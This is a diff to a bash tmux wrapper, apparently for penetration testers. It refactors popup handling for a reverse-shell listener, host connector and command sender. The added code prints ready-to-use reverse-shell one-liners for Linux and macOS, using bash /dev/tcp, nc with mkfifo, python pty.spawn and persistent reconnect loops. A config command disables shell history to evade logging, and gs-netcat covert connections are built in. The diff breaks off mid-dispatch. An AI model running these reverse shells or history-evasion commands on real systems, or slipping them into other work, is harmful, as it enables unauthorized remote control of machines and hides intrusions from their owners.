@@ -31,16 +31,11 @@ declare -a GS_ENTRIES # "name|description|secret"
 declare -a CMD_NAMES
 declare -a CMD_VALUES
 
-# Temp files (set at startup)
+# Data files (set at startup)
 HOSTS_FILE=""
 CMDS_FILE=""
-F1_SCRIPT=""
-F2_SCRIPT=""
-F5_SCRIPT=""
-F9_SCRIPT=""
-HELP_FILE=""
-LISTENER_INFO_FILE=""
-CTRLC_SCRIPT=""
+
+POPUP_ACTION=""
 
 # ── usage ─────────────────────────────────────────────────────────────────────
 usage() {
@@ -59,7 +54,7 @@ Config: ~/.tmuxer.conf (shell-sourceable)
   logdir=~/tmuxer-logs
   prepend_space=1
   cmd_1_name="Disable History"
-  cmd_1="unset HISTFILE; export HISTFILESIZE=0; export HISTSIZE=0; set +o history"
+  cmd_1="unset HISTFILE; export HISTSIZE=0 HISTFILESIZE=0 SAVEHIST=0; set +o history 2>/dev/null; setopt nohistory 2>/dev/null"
   cmd_2_name="Quick Recon"
   cmd_2="id; uname -a; hostname"
   cmd_3_name="Full Recon"
@@ -89,7 +84,7 @@ prepend_space=1
 gsocket_hosts=$HOME/.gsocket/hosts
 
 cmd_1_name="Disable History"
-cmd_1="unset HISTFILE; export HISTFILESIZE=0; export HISTSIZE=0; set +o history"
+cmd_1="unset HISTFILE; export HISTSIZE=0 HISTFILESIZE=0 SAVEHIST=0; set +o history 2>/dev/null; setopt nohistory 2>/dev/null"
 
 cmd_2_name="Quick Recon"
 cmd_2="id; uname -a; hostname"
@@ -243,15 +238,29 @@ parse_gsocket_hosts() {
 }
 
 # ── reverse shells ────────────────────────────────────────────────────────────
-build_revshells() {
-  local ip
+# Compute and print revshell one-liners at display time (never stored in tmux
+# options — tmux escapes $ to \$ in option values, breaking copy-paste).
+_print_revshells() {
+  local port ip
+  port=$(tmux_gopt @tmuxer_port)
   ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
   ip=${ip:-$(hostname -I 2>/dev/null | awk '{print $1}')}
-  # S4: macOS fallback
-  ip=${ip:-$(ifconfig 2>/dev/null | awk '/inet / && !/127\.0\.0\.1/{print $2; exit}')}
+  ip=${ip:-$(ifconfig 2>/dev/null | awk '/inet / && !/127\.0\.0\.1/{print $2;exit}')}
   ip=${ip:-"<your-ip>"}
-  REVSHELL_BASH="H=$ip;P=$PORT;NC=\$(type -P nc||type -P ncat);if [ -n \"\$NC\" ];then F=\$(mktemp);rm \$F;mkfifo \$F;cat \$F|sh -i 2>&1|\$NC \$H \$P >\$F;else bash -i >/dev/tcp/\$H/\$P 0>&1 2>&1;fi"
-  REVSHELL_PYTHON="H=$ip;P=$PORT;PY=\$(type -P python3 2>/dev/null||type -P python 2>/dev/null);if [ -n \"\$PY\" ];then \$PY -c \"import socket,os,pty;s=socket.socket();s.connect(('\$H',\$P));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')\";else NC=\$(type -P nc||type -P ncat);F=\$(mktemp);rm \$F;mkfifo \$F;cat \$F|sh -i 2>&1|\$NC \$H \$P >\$F;fi"
+
+  printf '\nReverse shells  [%s:%s]\n' "$ip" "$port"
+
+  printf '\n  ── Linux ──\n'
+  printf '  bash      bash -i >& /dev/tcp/%s/%s 0>&1\n' "$ip" "$port"
+  printf '  nc        C="command -v";NC=$($C nc||$C ncat);F=/tmp/f$$;mkfifo $F;cat $F|sh -i 2>&1|$NC %s %s >$F;rm $F\n' "$ip" "$port"
+  printf '  python    python3 -c "import socket,os,pty;s=socket.socket();s.connect((\047%s\047,%s));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\047/bin/bash\047)"\n' "$ip" "$port"
+  printf '  reconnect while true;do C="command -v";SH=$($C bash||$C sh);NC=$($C nc||$C ncat);F=/tmp/f$$;mkfifo $F;cat $F|$SH -i 2>&1|$NC %s %s >$F;rm $F;sleep 3;done\n' "$ip" "$port"
+
+  printf '\n  ── macOS ──\n'
+  printf '  bash      bash -i >& /dev/tcp/%s/%s 0>&1\n' "$ip" "$port"
+  printf '  nc        F=/tmp/f$$;mkfifo $F;sh -i <$F 2>&1|nc %s %s >$F;rm $F\n' "$ip" "$port"
+  printf '  python    python3 -c "import socket,os,pty;s=socket.socket();s.connect((\047%s\047,%s));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\047/bin/zsh\047)"\n' "$ip" "$port"
+  printf '  reconnect while true;do C="command -v";SH=$($C bash||$C sh);F=/tmp/f$$;mkfifo $F;$SH -i <$F 2>&1|nc %s %s >$F;rm $F;sleep 3;done\n' "$ip" "$port"
 }
 
 # ── tmux setup ────────────────────────────────────────────────────────────────
@@ -277,28 +286,40 @@ apply_tmux_settings() {
   tmux set-option -g status-right "F9→listen | %H:%M"
 }
 
-# ── scripts & data files ──────────────────────────────────────────────────────
-build_scripts() {
-  local fzf_bin
-  fzf_bin="$(type -P fzf 2>/dev/null)" || fzf_bin=""
+# ── tmux option helpers ───────────────────────────────────────────────────────
+tmux_gopt() { tmux show-options -gv "$1" 2>/dev/null; }
 
-  # S7: check tmux version for display-menu (non-fzf path)
-  local tmux_ver=0
-  if [[ -z "$fzf_bin" ]]; then
+# ── store runtime state in tmux session options ───────────────────────────────
+store_tmux_options() {
+  tmux set-option -g @tmuxer_port          "$PORT"
+  tmux set-option -g @tmuxer_hosts_file    "$HOSTS_FILE"
+  tmux set-option -g @tmuxer_cmds_file     "$CMDS_FILE"
+  tmux set-option -g @tmuxer_prepend_space "$PREPEND_SPACE"
+  tmux set-option -g @tmuxer_logdir        "$LOGDIR"
+  tmux set-option -g @tmuxer_pid_file      "$LISTENER_PID_FILE"
+  tmux set-option -g @tmuxer_self          "$SELF"
+  tmux set-option -g @tmuxer_gs_hosts_file "$GSOCKET_HOSTS"
+
+  # S7: warn on old tmux when fzf is absent
+  if [[ -z "$(type -P fzf 2>/dev/null)" ]]; then
+    local tmux_ver
     tmux_ver=$(tmux -V 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
     if [[ -z "$tmux_ver" ]] || [[ "$(printf '%s\n' "3.0" "$tmux_ver" | sort -V | head -1)" != "3.0" ]]; then
       echo "warning: tmux >= 3.0 recommended (have ${tmux_ver:-unknown})"
       echo "         install fzf for a better experience on older tmux"
     fi
   fi
+}
 
-  # ── HELP / LISTENER static content ─────────────────────────────────────────
-  HELP_FILE=$(mktemp /tmp/tmuxer_help_XXXXXX)
-  cat >"$HELP_FILE" <<'HELPEOF'
+# ── popup handlers (called via $SELF --popup <action>) ────────────────────────
+
+_help_banner() {
+  cat <<'HELPEOF'
 ┌─ tmuxer shortcuts ───────────────────────────────────────────────────────────┐
 │  F1   show this help                                                         │
 │  F2   host connector (SSH + GSocket) — type to filter, Enter to connect      │
 │  F3   toggle raw mode (pty.spawn connections)                                │
+│  F4   open session notes (~/notes/<session>-notes.md) in $EDITOR            │
 │  F5   send commands (config-defined) — type to filter, Enter to send         │
 │  F9   toggle reverse shell listener on/off                                   │
 ├──────────────────────────────────────────────────────────────────────────────┤
@@ -309,19 +330,196 @@ build_scripts() {
 │  Activity  inactive windows turn yellow in the status bar on new output      │
 └──────────────────────────────────────────────────────────────────────────────┘
 HELPEOF
-  {
-    printf '\nReverse shells (listener on :%s):\n' "$PORT"
-    printf '  [bash]   %s\n' "$REVSHELL_BASH"
-    printf '  [python] %s\n' "$REVSHELL_PYTHON"
-  } >>"$HELP_FILE"
+}
 
-  LISTENER_INFO_FILE=$(mktemp /tmp/tmuxer_listener_info_XXXXXX)
-  # TODO: these two help texts are almost the same, first one is more thorough, same one should be used
-  cat >"$LISTENER_INFO_FILE" <<'INFOEOF'
+popup_f1() {
+  _help_banner
+  _print_revshells
+  printf '\nPress Enter to close...'
+  read -r _
+}
+
+_add_gsocket_host() {
+  local hosts_file gs_file name desc secret
+  hosts_file=$(tmux_gopt @tmuxer_hosts_file)
+  gs_file=$(tmux_gopt @tmuxer_gs_hosts_file)
+  [[ -z "$gs_file" ]] && { echo "error: GSocket hosts file not configured" >&2; printf 'Press Enter...'; read -r _; return; }
+  printf '\n── Add GSocket host ──────────────────────\n'
+  printf 'Name (required):   '; read -r name
+  [[ -z "$name" ]] && { echo "cancelled."; return; }
+  [[ "$name" == *'|'* ]] && { echo "error: name cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
+  printf 'Description:       '; read -r desc
+  [[ "$desc" == *'|'* ]] && { echo "error: description cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
+  printf 'Secret (required): '; read -r secret
+  [[ -z "$secret" ]] && { echo "cancelled."; return; }
+  [[ "$secret" == *'|'* ]] && { echo "error: secret cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
+  printf '%s|%s|%s\n' "$name" "$desc" "$secret" >> "$gs_file"
+  printf 'GS: %s (%s)|GS:%s|%s|%s\n' "$name" "$desc" "$name" "$desc" "$secret" >> "$hosts_file"
+  printf 'added: %s\n' "$name"
+  printf 'Press Enter...'; read -r _
+}
+
+_add_command() {
+  local cmds_file name cmd next_n
+  cmds_file=$(tmux_gopt @tmuxer_cmds_file)
+  printf '\n── Add command ───────────────────────────\n'
+  printf 'Name (required): '; read -r name
+  [[ -z "$name" ]] && { echo "cancelled."; return; }
+  [[ "$name" == *'|'* ]] && { echo "error: name cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
+  printf 'Command:         '; read -r cmd
+  [[ -z "$cmd" ]] && { echo "cancelled."; return; }
+  next_n=$(( $(wc -l < "$cmds_file" 2>/dev/null || echo 0) + 1 ))
+  printf '\ncmd_%d_name=%q\ncmd_%d=%q\n' "$next_n" "$name" "$next_n" "$cmd" >> "$HOME/.tmuxer.conf"
+  printf '%s|%s\n' "$name" "$cmd" >> "$cmds_file"
+  printf 'added: %s\n' "$name"
+  printf 'Press Enter...'; read -r _
+}
+
+popup_f2() {
+  local hosts_file fzf_bin sel action type rest
+  hosts_file=$(tmux_gopt @tmuxer_hosts_file)
+  fzf_bin=$(type -P fzf 2>/dev/null) || fzf_bin=""
+  local ADD_NEW='[ + Add new GSocket host ]'
+
+  if [[ -n "$fzf_bin" ]]; then
+    sel=$({ [[ -s "$hosts_file" ]] && awk -F'|' '{print $1}' "$hosts_file"; printf '%s\n' "$ADD_NEW"; } \
+      | fzf --color=dark --header='Hosts (type to filter, Enter=connect, Esc=cancel)' --height=20 --border)
+    [[ -z "$sel" ]] && return
+    if [[ "$sel" == "$ADD_NEW" ]]; then _add_gsocket_host; return; fi
+    action=$(grep -m1 -F "$sel|" "$hosts_file" | cut -d'|' -f2-)
+  else
+    declare -a labels actions
+    [[ -s "$hosts_file" ]] && while IFS='|' read -r label act; do
+      [[ -z "$label" ]] && continue
+      labels+=("$label"); actions+=("$act")
+    done < "$hosts_file"
+    labels+=("$ADD_NEW"); actions+=("ADD_NEW")
+    echo "Hosts:"
+    for i in "${!labels[@]}"; do printf '  %d) %s\n' $((i+1)) "${labels[$i]}"; done
+    printf '\nSelect (1-%d, Enter=cancel): ' ${#labels[@]}
+    read -r choice
+    [[ -z "$choice" || ! "$choice" =~ ^[0-9]+$ ]] && return
+    local idx=$((choice - 1))
+    [[ $idx -ge 0 && $idx -lt ${#labels[@]} ]] || return
+    action="${actions[$idx]}"
+    if [[ "$action" == "ADD_NEW" ]]; then _add_gsocket_host; return; fi
+  fi
+
+  type="${action%%:*}"
+  rest="${action#*:}"
+  case "$type" in
+    SSH)
+      tmux display-message "Connecting to $rest..."
+      tmux new-window -n "$rest" "ssh $rest || { echo; echo 'SSH failed (press Enter)'; read -r _; }"
+      ;;
+    GS)
+      local gs_name gs_secret
+      gs_name="${rest%%|*}"
+      gs_secret="${rest##*|}"
+      tmux display-message "Connecting to GS: $gs_name..."
+      tmux new-window -n "$gs_name" "gs-netcat -s '$gs_secret' -i || { echo; echo 'GS failed (press Enter)'; read -r _; }"
+      ;;
+  esac
+}
+
+popup_f5() {
+  local cmds_file prepend_space fzf_bin fifo sel cmd_val cmd_name
+  cmds_file=$(tmux_gopt @tmuxer_cmds_file)
+  prepend_space=$(tmux_gopt @tmuxer_prepend_space)
+  fzf_bin=$(type -P fzf 2>/dev/null) || fzf_bin=""
+  fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
+  local ADD_NEW='[ + Add new command ]'
+
+  if [[ -n "$fzf_bin" ]]; then
+    sel=$({ [[ -s "$cmds_file" ]] && awk -F'|' '{print $1}' "$cmds_file"; printf '%s\n' "$ADD_NEW"; } \
+      | fzf --color=dark --header='Commands (type to filter, Enter=send, Esc=cancel)' --height=20 --border)
+    [[ -z "$sel" ]] && return
+    if [[ "$sel" == "$ADD_NEW" ]]; then _add_command; return; fi
+    cmd_val=$(grep -m1 -F "$sel|" "$cmds_file" | cut -d'|' -f2-)
+    cmd_name="$sel"
+  else
+    declare -a names vals
+    [[ -s "$cmds_file" ]] && while IFS='|' read -r name val; do
+      [[ -z "$name" ]] && continue
+      names+=("$name"); vals+=("$val")
+    done < "$cmds_file"
+    names+=("$ADD_NEW"); vals+=("ADD_NEW")
+    echo "Commands:"
+    for i in "${!names[@]}"; do printf '  %d) %s\n' $((i+1)) "${names[$i]}"; done
+    printf '\nSelect (1-%d, Enter=cancel): ' ${#names[@]}
+    read -r choice
+    [[ -z "$choice" || ! "$choice" =~ ^[0-9]+$ ]] && return
+    local idx=$((choice - 1))
+    [[ $idx -ge 0 && $idx -lt ${#names[@]} ]] || return
+    cmd_val="${vals[$idx]}"
+    cmd_name="${names[$idx]}"
+    if [[ "$cmd_val" == "ADD_NEW" ]]; then _add_command; return; fi
+  fi
+
+  if [[ -p "$fifo" ]]; then
+    [[ "$prepend_space" == "1" ]] && printf ' %s\n' "$cmd_val" >> "$fifo" || printf '%s\n' "$cmd_val" >> "$fifo"
+    tmux display-message "Sent: $cmd_name"
+  else
+    [[ "$prepend_space" == "1" ]] && tmux send-keys " $cmd_val" Enter || tmux send-keys "$cmd_val" Enter
+    tmux display-message "Sent (keys): $cmd_name"
+  fi
+}
+
+popup_f9() {
+  local pid_file port logdir self
+  pid_file=$(tmux_gopt @tmuxer_pid_file)
+  port=$(tmux_gopt @tmuxer_port)
+  logdir=$(tmux_gopt @tmuxer_logdir)
+  self=$(tmux_gopt @tmuxer_self)
+
+  if [[ -f "$pid_file" ]]; then
+    local pid listener_win
+    pid=$(head -1 "$pid_file" 2>/dev/null)
+    listener_win=$(sed -n '2p' "$pid_file" 2>/dev/null)
+    [[ -n "$pid" ]] && kill "$pid" 2>/dev/null
+    sleep 0.2
+    [[ -n "$pid" ]] && kill -9 "$pid" 2>/dev/null
+    [[ -n "$listener_win" ]] && tmux kill-window -t "$listener_win" 2>/dev/null
+    rm -f "$pid_file"
+    tmux set-option -g status-right "F9→listen | %H:%M"
+    tmux display-message "Listener stopped (:${port})"
+    return
+  fi
+
+  local win_id listener_tty
+  win_id=$(tmux new-window -P -F "#{window_id}" -n "listener" \
+    "$self --popup listener; while sleep 3600; do :; done")
+  sleep 0.3
+  listener_tty=$(tmux display-message -p -t "$win_id" '#{pane_tty}')
+
+  # M2: pass logdir via env var to avoid space-splitting in socat EXEC
+  export LISTENER_TTY="$listener_tty"
+  export HANDLER_LOGDIR="$logdir"
+  export INIT_CMDS=""
+  export PREPEND_SPACE
+
+  socat TCP4-LISTEN:${port},reuseaddr,fork EXEC:"$self handler",nofork >/dev/null 2>&1 &
+  local socat_pid=$!
+  disown
+  echo "$socat_pid" > "$pid_file"
+  echo "$win_id" >> "$pid_file"
+  tmux set-option -g status-right "LISTEN:$port | %H:%M"
+  tmux display-message "Listener started on :$port"
+}
+
+popup_ctrlc() {
+  local fifo
+  fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
+  [[ -p "$fifo" ]] && printf '\003' >> "$fifo"
+}
+
+popup_listener() {
+  cat <<'INFOEOF'
 ┌─ tmuxer listener ────────────────────────────────────────────────────────────┐
 │  F1   full help & shortcuts                                                  │
 │  F2   host connector (SSH + GSocket)                                         │
 │  F3   toggle raw mode (pty.spawn connections)                                │
+│  F4   open session notes in $EDITOR                                          │
 │  F5   send commands to active connection                                     │
 │  F9   stop this listener                                                     │
 ├──────────────────────────────────────────────────────────────────────────────┤
@@ -332,233 +530,8 @@ HELPEOF
 │  Activity  inactive windows turn yellow in the status bar on new output      │
 └──────────────────────────────────────────────────────────────────────────────┘
 INFOEOF
-  {
-    printf '\nReverse shells (listener on :%s):\n' "$PORT"
-    printf '  [bash]   %s\n' "$REVSHELL_BASH"
-    printf '  [python] %s\n' "$REVSHELL_PYTHON"
-    printf '\n[*] Waiting for connections...\n'
-  } >>"$LISTENER_INFO_FILE"
-
-  # ── F1: help popup (Enter to close) ───────────────────────────────────────
-  # TODO: skip catting to file, keep the help in a variable and include that directly
-  F1_SCRIPT=$(mktemp /tmp/tmuxer_f1_XXXXXX)
-  cat >"$F1_SCRIPT" <<F1EOF
-#!/usr/bin/env bash
-cat "$HELP_FILE"
-printf '\nPress Enter to close...'
-read -r _
-F1EOF
-  chmod +x "$F1_SCRIPT"
-
-  # ── F2: host connector ────────────────────────────────────────────────────
-  F2_SCRIPT=$(mktemp /tmp/tmuxer_f2_XXXXXX)
-  if [[ -n "$fzf_bin" ]]; then
-    cat >"$F2_SCRIPT" <<F2EOF
-#!/usr/bin/env bash
-hosts="$HOSTS_FILE"
-[[ -s "\$hosts" ]] || { echo "No hosts found."; echo "Sources: ~/.ssh/config ~/.gsocket/hosts"; printf '\\nPress Enter...'; read -r _; exit 0; }
-sel=\$(awk -F'|' '{print \$1}' "\$hosts" | fzf --color=dark --header='Hosts (type to filter, Enter=connect, Esc=cancel)' --height=20 --border)
-[[ -z "\$sel" ]] && exit 0
-action=\$(grep -m1 -F "\$sel|" "\$hosts" | cut -d'|' -f2-)
-type="\${action%%:*}"
-rest="\${action#*:}"
-case "\$type" in
-  SSH)
-    tmux display-message "Connecting to \$rest..."
-    # S3: GS secret via env var; M1: quote hostname properly
-    tmux new-window -n "\$rest" "ssh \$rest || { echo; echo 'SSH failed (press Enter)'; read -r _; }"
-    ;;
-  GS)
-    gs_name="\${rest%%|*}"
-    gs_rest="\${rest#*|}"
-    gs_desc="\${gs_rest%%|*}"
-    gs_secret="\${gs_rest##*|}"
-    tmux display-message "Connecting to GS: \$gs_name..."
-    tmux new-window -n "\$gs_name" 'export GS_SECRET="'\$gs_secret"'"; gs-netcat -s "\$GS_SECRET" -i || { echo; echo "GS failed (press Enter)"; read -r _; }'
-    ;;
-esac
-    read -r _;
-F2EOF
-  else
-    # S1: Non-fzf fallback — use numbered menu with read (works in popup pty)
-    {
-      printf '#!/usr/bin/env bash\n'
-      printf 'hosts_file=%q\n' "$HOSTS_FILE"
-    } >"$F2_SCRIPT"
-    cat >>"$F2_SCRIPT" <<'F2EOF'
-[[ -s "$hosts_file" ]] || { echo "No hosts found."; echo "Sources: ~/.ssh/config ~/.gsocket/hosts"; printf '\nPress Enter...'; read -r _; exit 0; }
-
-declare -a labels actions
-while IFS='|' read -r label action; do
-  [[ -z "$label" ]] && continue
-  labels+=("$label")
-  actions+=("$action")
-done < "$hosts_file"
-
-if [[ ${#labels[@]} -eq 0 ]]; then
-  echo "No hosts found."
-  printf 'Press Enter...'
-  read -r _
-  exit 0
-fi
-
-echo "Hosts:"
-for i in "${!labels[@]}"; do
-  printf '  %d) %s\n' $((i+1)) "${labels[$i]}"
-done
-printf '\nSelect (1-%d, Enter=cancel): ' ${#labels[@]}
-read -r choice
-[[ -z "$choice" ]] && exit 0
-[[ "$choice" =~ ^[0-9]+$ ]] || exit 0
-idx=$((choice - 1))
-[[ $idx -ge 0 ]] && [[ $idx -lt ${#labels[@]} ]] || exit 0
-
-action="${actions[$idx]}"
-type="${action%%:*}"
-rest="${action#*:}"
-
-if [[ "$type" == "SSH" ]]; then
-  tmux display-message "Connecting to $rest..."
-  tmux new-window -n "$rest" "ssh $rest || { echo; echo 'SSH failed (press Enter)'; read -r _; }"
-else
-  gs_name="${rest%%|*}"
-  gs_rest="${rest#*|}"
-  gs_secret="${gs_rest##*|}"
-  tmux display-message "Connecting to GS: $gs_name..."
-  tmux new-window -n "$gs_name" 'export GS_SECRET="'"$gs_secret"'"; gs-netcat -s "$GS_SECRET" -i || { echo; echo "GS failed (press Enter)"; read -r _; }'
-fi
-F2EOF
-  fi
-  chmod +x "$F2_SCRIPT"
-
-  # ── F5: command popup ─────────────────────────────────────────────────────
-  F5_SCRIPT=$(mktemp /tmp/tmuxer_f5_XXXXXX)
-  if [[ -n "$fzf_bin" ]]; then
-    cat >"$F5_SCRIPT" <<F5EOF
-#!/usr/bin/env bash
-cmds="$CMDS_FILE"
-fifo=\$(tmux show-options -wv @out_fifo 2>/dev/null)
-[[ -s "\$cmds" ]] || { echo "No commands defined in ~/.tmuxer.conf"; printf '\\nPress Enter...'; read -r _; exit 0; }
-sel=\$(awk -F'|' '{print \$1}' "\$cmds" | fzf --color=dark --header='Commands (type to filter, Enter=send, Esc=cancel)' --height=20 --border)
-[[ -z "\$sel" ]] && exit 0
-cmd_val=\$(grep -m1 -F "\$sel|" "\$cmds" | cut -d'|' -f2-)
-cmd_name="\$sel"
-if [[ -p "\$fifo" ]]; then
-F5EOF
-    if [[ "$PREPEND_SPACE" == "1" ]]; then
-      echo '  printf " %s\n" "$cmd_val" >> "$fifo"' >>"$F5_SCRIPT"
-    else
-      echo '  printf "%s\n" "$cmd_val" >> "$fifo"' >>"$F5_SCRIPT"
-    fi
-    cat >>"$F5_SCRIPT" <<'F5EOF'
-  tmux display-message "Sent: $cmd_name"
-else
-  tmux send-keys "$cmd_val" Enter
-  tmux display-message "Sent (keys): $cmd_name"
-fi
-F5EOF
-  else
-    # S1: Non-fzf fallback — use numbered menu with read
-    {
-      printf '#!/usr/bin/env bash\n'
-      printf 'cmds_file=%q\n' "$CMDS_FILE"
-      printf 'prepend_space=%q\n' "$PREPEND_SPACE"
-    } >"$F5_SCRIPT"
-    cat >>"$F5_SCRIPT" <<'F5EOF'
-fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
-[[ -s "$cmds_file" ]] || { echo "No commands defined in ~/.tmuxer.conf"; printf '\nPress Enter...'; read -r _; exit 0; }
-
-declare -a names vals
-while IFS='|' read -r name val; do
-  [[ -z "$name" ]] && continue
-  names+=("$name")
-  vals+=("$val")
-done < "$cmds_file"
-
-if [[ ${#names[@]} -eq 0 ]]; then
-  echo "No commands defined."
-  printf 'Press Enter...'
-  read -r _
-  exit 0
-fi
-
-echo "Commands:"
-for i in "${!names[@]}"; do
-  printf '  %d) %s\n' $((i+1)) "${names[$i]}"
-done
-printf '\nSelect (1-%d, Enter=cancel): ' ${#names[@]}
-read -r choice
-[[ -z "$choice" ]] && exit 0
-[[ "$choice" =~ ^[0-9]+$ ]] || exit 0
-idx=$((choice - 1))
-[[ $idx -ge 0 ]] && [[ $idx -lt ${#names[@]} ]] || exit 0
-
-cmd_val="${vals[$idx]}"
-cmd_name="${names[$idx]}"
-
-if [[ -p "$fifo" ]]; then
-  if [[ "$prepend_space" == "1" ]]; then
-    printf ' %s\n' "$cmd_val" >> "$fifo"
-  else
-    printf '%s\n' "$cmd_val" >> "$fifo"
-  fi
-  tmux display-message "Sent: $cmd_name"
-else
-  if [[ "$prepend_space" == "1" ]]; then
-    tmux send-keys " $cmd_val" Enter
-  else
-    tmux send-keys "$cmd_val" Enter
-  fi
-  tmux display-message "Sent (keys): $cmd_name"
-fi
-F5EOF
-  fi
-  chmod +x "$F5_SCRIPT"
-
-  # ── F9: listener toggle ───────────────────────────────────────────────────
-  F9_SCRIPT=$(mktemp /tmp/tmuxer_f9_XXXXXX)
-  cat >"$F9_SCRIPT" <<F9EOF
-#!/usr/bin/env bash
-pid_file="$LISTENER_PID_FILE"
-self="$SELF"
-port="$PORT"
-logdir="$LOGDIR"
-info_file="$LISTENER_INFO_FILE"
-
-if [[ -f "\$pid_file" ]]; then
-  pid=\$(head -1 "\$pid_file" 2>/dev/null)
-  listener_win=\$(sed -n '2p' "\$pid_file" 2>/dev/null)
-  [[ -n "\$pid" ]] && kill "\$pid" 2>/dev/null
-  sleep 0.2
-  [[ -n "\$pid" ]] && kill -9 "\$pid" 2>/dev/null
-  [[ -n "\$listener_win" ]] && tmux kill-window -t "\$listener_win" 2>/dev/null
-  rm -f "\$pid_file"
-  tmux set-option -g status-right "F9→listen | %H:%M"
-  tmux display-message "Listener stopped (:\${port})"
-  exit 0
-fi
-
-# Start listener window
-win_id=\$(tmux new-window -P -F "#{window_id}" -n "listener" \
-  "cat \$info_file; echo 'Press F9 to stop'; while sleep 3600; do :; done")
-sleep 0.3
-listener_tty=\$(tmux display-message -p -t "\$win_id" '#{pane_tty}')
-
-# M2: pass logdir via env var to avoid space-splitting in socat EXEC
-export LISTENER_TTY="\$listener_tty"
-export HANDLER_LOGDIR="\$logdir"
-export INIT_CMDS=""
-export PREPEND_SPACE="$PREPEND_SPACE"
-
-socat TCP4-LISTEN:\${port},reuseaddr,fork EXEC:"\$self handler",nofork >/dev/null 2>&1 &
-socat_pid=\$!
-disown
-echo "\$socat_pid" > "\$pid_file"
-echo "\$win_id" >> "\$pid_file"
-tmux set-option -g status-right "LISTEN:\$port | %H:%M"
-tmux display-message "Listener started on :\$port"
-F9EOF
-  chmod +x "$F9_SCRIPT"
+  _print_revshells
+  printf '\n[*] Waiting for connections...\n'
 }
 
 # ── data files ────────────────────────────────────────────────────────────────
@@ -584,40 +557,29 @@ build_data_files() {
 
 # ── keybindings ───────────────────────────────────────────────────────────────
 bind_keys() {
-  # F1: help popup (Enter to close)
-  tmux bind-key -n F1 display-popup -E -w 90% -h 90% "$F1_SCRIPT"
-
-  # F2: host connector popup
-  tmux bind-key -n F2 display-popup -E -w 80% -h 80% "$F2_SCRIPT"
+  tmux bind-key -n F1 display-popup -E -w 90% -h 90% "$SELF --popup f1"
+  tmux bind-key -n F2 display-popup -E -w 80% -h 80% "$SELF --popup f2"
 
   # F3: raw mode toggle
   tmux bind-key -n F3 if-shell -F '#{==:#{@raw_mode},1}' \
     'run-shell "stty sane < #{pane_tty}"; set-option -w @raw_mode 0; display-message "raw mode OFF — cooked restored"' \
     'run-shell "stty raw -echo < #{pane_tty}"; set-option -w @raw_mode 1; display-message "raw mode ON — pty.spawn active"'
 
-  # F5: command popup
-  tmux bind-key -n F5 display-popup -E -w 80% -h 80% "$F5_SCRIPT"
+  # F4: vertical split → open session notes in $EDITOR; pane auto-closes when editor exits
+  tmux bind-key -n F4 split-window -h \
+    'mkdir -p ~/notes && ${EDITOR:-vi} ~/notes/#{session_name}-notes.md'
 
-  # F9: listener toggle (background — non-blocking)
-  tmux bind-key -n F9 run-shell -b "$F9_SCRIPT"
-
-  # Ctrl-c
-  CTRLC_SCRIPT=$(mktemp /tmp/tmuxer_ctrlc_XXXXXX)
-  cat >"$CTRLC_SCRIPT" <<'CTRLC'
-#!/usr/bin/env bash
-fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
-[[ -p "$fifo" ]] && printf '\003' >> "$fifo"
-CTRLC
-  chmod +x "$CTRLC_SCRIPT"
+  tmux bind-key -n F5 display-popup -E -w 80% -h 80% "$SELF --popup f5"
+  tmux bind-key -n F9 run-shell -b "$SELF --popup f9"
 
   tmux bind-key -n C-c if-shell -F '#{==:#{window_index},0}' \
     'send-keys C-c' \
     "if-shell -F '#{==:#{@raw_mode},1}' \
-      'run-shell \"$CTRLC_SCRIPT\"' \
-      'confirm-before -p \"Ctrl-C → remote? (y/n)\" \"run-shell \\\"$CTRLC_SCRIPT\\\"\"'"
+      'run-shell \"$SELF --popup ctrlc\"' \
+      'confirm-before -p \"Ctrl-C → remote? (y/n)\" \"run-shell \\\"$SELF --popup ctrlc\\\"\"'"
 
-  # C1: kill listener before removing PID file so cat can still read it
-  tmux set-hook session-closed "run-shell 'kill \$(cat $LISTENER_PID_FILE 2>/dev/null) 2>/dev/null; sleep 0.2; rm -f $LISTENER_PID_FILE $HOSTS_FILE $CMDS_FILE $HELP_FILE $LISTENER_INFO_FILE $F1_SCRIPT $F2_SCRIPT $F5_SCRIPT $F9_SCRIPT $CTRLC_SCRIPT'"
+  # C1: kill listener before removing PID file so socat can still read it
+  tmux set-hook session-closed "run-shell 'kill \$(cat $LISTENER_PID_FILE 2>/dev/null) 2>/dev/null; sleep 0.2; rm -f $LISTENER_PID_FILE $HOSTS_FILE $CMDS_FILE'"
 }
 
 # ── connection handler ────────────────────────────────────────────────────────
@@ -625,7 +587,7 @@ handle_connection() {
   local remote_ip="${SOCAT_PEERADDR:-unknown}"
   local in out logfile win_id new_pane_tty in_pid out_pid
 
-  # M2: read logdir from env var (set by F9_SCRIPT) to avoid space-splitting
+  # M2: read logdir from env var (set by F9 popup) to avoid space-splitting
   local logdir="${HANDLER_LOGDIR:-}"
 
   echo "[+] incoming connection from $remote_ip" >"$LISTENER_TTY"
@@ -722,12 +684,11 @@ start_tmuxer() {
     exit 1
   fi
 
-  build_revshells
   build_data_files
-  build_scripts
 
   enforce_tmux
   apply_tmux_settings
+  store_tmux_options
   bind_keys
 
   tmux rename-window "local" 2>/dev/null
@@ -766,6 +727,11 @@ while [[ $# -gt 0 ]]; do
     HANDLER_LOGDIR="${HANDLER_LOGDIR:-${1:-}}"
     shift
     ;;
+  --popup)
+    MODE=popup
+    POPUP_ACTION="${2:-}"
+    shift 2
+    ;;
   --logdir)
     LOGDIR="$2"
     shift 2
@@ -790,10 +756,24 @@ while [[ $# -gt 0 ]]; do
 done
 
 # ── dispatch ──────────────────────────────────────────────────────────────────
-if [[ "$MODE" == "handler" ]]; then
-  handle_connection
-else
-  export LOGDIR
-  export PREPEND_SPACE
-  start_tmuxer
-fi
+case "$MODE" in
